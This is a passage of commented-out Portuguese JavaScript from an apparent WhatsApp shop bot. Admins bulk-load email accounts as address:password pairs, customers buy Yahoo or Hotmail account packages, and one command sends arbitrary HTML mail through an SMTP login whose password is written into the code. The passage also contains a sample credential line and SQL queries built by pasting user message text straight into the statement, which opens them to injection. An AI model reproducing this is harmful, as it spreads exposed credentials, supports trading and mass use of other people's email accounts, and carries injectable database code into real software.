        //         Texto = `*E-MAIL ADICIONADO*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/definirEmail===") > -1) {
        //             try {
        //                 msg = Mensagem_Texto.split("===")
        //                 Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //                 if (msg[1] === "" || Array_Total_Igual.length != 3) {
        //                     Texto = `Comando inválido`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }
        //                 EMAIL_RECEBEDOR_Ant = await DataBase_Better.prepare(`SELECT EMAIL_RECEBEDOR FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["EMAIL_RECEBEDOR"]
        //                 EMAIL_RECEBEDOR = msg[1]
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET EMAIL_RECEBEDOR = '${EMAIL_RECEBEDOR}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

        //                 Texto = `*E-MAIL DE RECEBIMENTO ALTERADO COM SUCESSO!*

        // *ANTES:* R$: ${EMAIL_RECEBEDOR_Ant}

        // *AGORA:* R$: ${EMAIL_RECEBEDOR}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             } catch (error) {
        //                 console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/enviarEmail===") > -1 && Adms.includes(Numero)) {
        //             try {
        //                 msg = Mensagem_Texto.split("===")
        //                 Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //                 if (msg[1] === "" || Array_Total_Igual.length != 6) {
        //                     Texto = `Comando inválido`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }
        //                 EMAIL_ENVIAR = msg[1]
        //                 CORPO_ENVIAR = msg[2]

        //                 item_Array = await DataBase_Better.prepare(`SELECT * FROM EMAIL_VENDIDOS WHERE NUMERO_COMPRADOR = '${Mensagem_From}'`).all();

        //                 if (item_Array === undefined) {
        //                     Texto = `Não foi possível enviar o E-mail, você não possui E-mails comprados.

        // Ao possuir E-mails comprados, ao utilizar esse comando, um E-mail aleatório do estoque será responsável pelo envio.`
        //                     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                     return
        //                 }

        //                 Item_Escolhido = item_Array[Math.floor(Math.random() * item_Array.length)]

        //                 var nodemailer = require("nodemailer");

        //                 const transporter = nodemailer.createTransport({
        //                     host: 'smtp.terra.com.br',
        //                     port: 587,
        //                     auth: {
        //                         user: 'toyega@terra.com.br',
        //                         pass: '011410'
        //                     }
        //                 });

        //                 console.log(`${Item_Escolhido["EMAIL"]}`)
        //                 console.log(`${EMAIL_ENVIAR}`)
        //                 console.log(`ENVIADO POR ${Numero}`)
        //                 console.log(`${CORPO_ENVIAR}`)

        //                 // send email
        //                 await transporter.sendMail({
        //                     from: 'toyega@terra.com.br',
        //                     to: EMAIL_ENVIAR,
        //                     subject: `ENVIADO POR ${Numero}`,
        //                     html: `${CORPO_ENVIAR}`
        //                 });
        //                 return


        //             } catch (error) {
        //                 console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳








        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 






        //addemail===EMAIL:SENHA===PROVEDOR
        //addemail===narutovisk@terra.com:sasuke123===YAHOO
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addemail===") > -1 && Adms.includes(Numero)) {

        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[2] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[3] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Mensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "ABASTECENDO EMAILs...").then(async (result) => {

        //                     Linhas = Mensagem_Texto.split("\n")
        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             for (var index = 0; index < Linhas.length; index++) {
        //                                 try {

        //                                     Abastecendo = true

        //                                     Linha = Linhas[index].replace(/\/addemail\=\=\=/igm, '');
        //                                     Div = Linha.split("===")

        //                                     console.log(`Inserindo: ${Linha}`)

        //                                     Div_Credencial = Div[0].split(":")

        //                                     EMAIL = Div_Credencial[0]
        //                                     SENHA = Div_Credencial[1]
        //                                     PROVEDOR = Div[1]
        //                                     DATA_MS_INSERIDO = Date.now()

        //                                     db.run(`INSERT INTO EMAIL (EMAIL,SENHA,PROVEDOR,DATA_MS_INSERIDO) VALUES ('${EMAIL}','${SENHA}','${PROVEDOR}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                     Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
        //                                 } catch (error) {
        //                                     console.log(error)

        //                                     for await (adm of Adms) {
        //                                         Texto = `*Ocorreu algum problema no abastecimento.*

        // Já tinha abastecido ${Contagem_Abastecidas}.

        // Erro: ${error}`
        //                                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                             Abastecendo = false
        //                                             return
        //                                         }).catch(async(erro) => {
        //                                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                         });
        //                                     }
        //                                     return
        //                                 }
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // ${Linhas.length} EMAILs Extra Colocados para abastecimento.

        // ${Contagem_Abastecidas} EMAILs Extra Abastecidas.
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📧 EMAILs") > -1) {

        //     iD_Footer = Date.now()

        //     Texto = `*PROVEDORES DE EMAIL VÍNCULADOS AO BENEFÍCIO, ESCOLHA!*`

        //     await client.sendListMessage(Mensagem_From, {
        //         buttonText: 'PROVEDORES',
        //         description: Texto,
        //         sections: [
        //             {
        //                 title: "PROVEDORES DE EMAIL VÍNCULADOS AO BENEFÍCIO",
        //                 rows: [
        //                     {
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: "💜 EMAIL YAHOO",
        //                         description: "Lista de emails Yahoo disponíveis no estoque.",
        //                     },
        //                     {
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: "💙 EMAIL HOTMAIL",
        //                         description: "Lista de emails Hotmail disponíveis no estoque.",
        //                     }
        //                 ]
        //             },
        //         ],
        //     }).then(async (result) => {
        //         await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     }).catch(async(erro) => {
        //         console.error('Error when sending: ', erro);
        //     })
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("Lista de emails") > -1) {

        //             if (Mensagem_Texto.indexOf("💜 EMAIL YAHOO") > -1) {
        //                 PROVEDOR = "YAHOO"
        //             }
        //             if (Mensagem_Texto.indexOf("💙 EMAIL HOTMAIL") > -1) {
        //                 PROVEDOR = "HOTMAIL"
        //             }

        //             Categorias = await DataBase_Better.prepare(`SELECT * FROM EMAIL`).all();
        //             if (Categorias.length === 0) {

        //                 Texto = `*INFELIZMENTE ESTAMOS SEM ESTOQUE DE EMAILs NO MOMENTO.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 for await (adm of Adms) {

        //                     Texto = `⚠️ *ATENÇÃO ADM* ⚠️

        // Usuário: wa.me/${Numero}

        // Tentou efetuar a compra de EMAIL, mas o estoque está vazio!`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });

        //                 }
        //                 return
        //             }

        //             Array_PACOTE = await DataBase_Better.prepare(`SELECT * FROM PACOTES_EMAIL`).all();

        //             Array_Botoes = []
        //             for await (PACOTE of Array_PACOTE) {
        //                 //console.log(PACOTE["PROVEDOR"])
        //                 //console.log(PACOTE["QUANTIDADE"])
        //                 //console.log(PACOTE["VALOR"])
        //                 try {
        //                     Array_Botoes.push({
        //                         rowId: `${iD_Footer.toString()}|`,
        //                         title: `Quantidade: ${PACOTE["QUANTIDADE"]}, EMAILs ${PROVEDOR}`,
        //                         description: `📧 PREÇO: R$: ${PACOTE["VALOR"]}💰`
        //                     })
        //                 } catch (error) {
        //                     await Menu(client, Numero, Mensagem_From)
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }
        //             }

        //             iD_Footer = Date.now()
        //             Texto = `📦 *PACOTES DE EMAILS ${PROVEDOR}* 📦

        // Clique em *PACOTES ${PROVEDOR}* e escolha o pacote desejado e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra do mesmo.

        // ⚠️*MUITA ATENÇÃO AO ESCOLHER UM DOS PACOTES!*⚠️`

